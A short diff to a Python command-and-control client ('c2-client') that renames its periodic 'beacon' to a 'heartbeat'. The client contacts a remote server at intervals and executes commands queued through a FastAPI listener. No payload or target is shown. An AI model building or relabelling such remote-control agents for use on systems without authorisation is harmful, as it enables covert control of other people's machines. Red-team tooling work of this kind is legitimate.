@@ -3,11 +3,11 @@ from multiprocessing import Process, Queue
 from typing import Iterable
 
 import uvicorn
-from beacon import beacon
 from fastapi import FastAPI
+from heartbeat import heartbeat
 from logger import LOGGING_CONFIG, keyboard_interrupt_handler, setup_logger
 from schema import Command, CommandType, Message, StatusType
-from settings import BEACON_INTERVAL_SECONDS, REMOTE_SERVER
+from settings import HEARTBEAT_INTERVAL_SECONDS, REMOTE_SERVER
 from tasks import quit_app, run_command
 
 
@@ -34,7 +34,7 @@ def create_listener(command_queue: Queue) -> FastAPI:
         return Message(identifier=command.identifier, status=StatusType.RECEIVED)
 
     @app.post("/", response_model=None)
-    async def get_beacon(msg: Message) -> None:
+    async def get_heartbeat(msg: Message) -> None:
         # print(msg)
         ...
 
@@ -43,11 +43,11 @@ def create_listener(command_queue: Queue) -> FastAPI:
 
 if __name__ == "__main__":
     setup_logger("c2-client")
-    beacon_process = Process(
-        target=beacon,
-        kwargs=dict(server=REMOTE_SERVER, interval=BEACON_INTERVAL_SECONDS),
+    heartbeat_process = Process(
+        target=heartbeat,
+        kwargs=dict(server=REMOTE_SERVER, interval=HEARTBEAT_INTERVAL_SECONDS),
     )
-    beacon_process.start()
+    heartbeat_process.start()
 
     command_queue: Queue = Queue()
     main_process_pid = os.getpid()
@@ -55,7 +55,7 @@ if __name__ == "__main__":
         target=command_processor,
         kwargs=dict(
             queue=command_queue,
-            pids_to_kill_on_quit=[main_process_pid, beacon_process.pid],
+            pids_to_kill_on_quit=[main_process_pid, heartbeat_process.pid],
         ),
     )
     command_executer.start()
@@ -68,4 +68,4 @@ if __name__ == "__main__":
         # ssl_certfile=Path("../keys/cert.pem"),
     )
     command_executer.join()
-    beacon_process.join()
+    heartbeat_process.join()
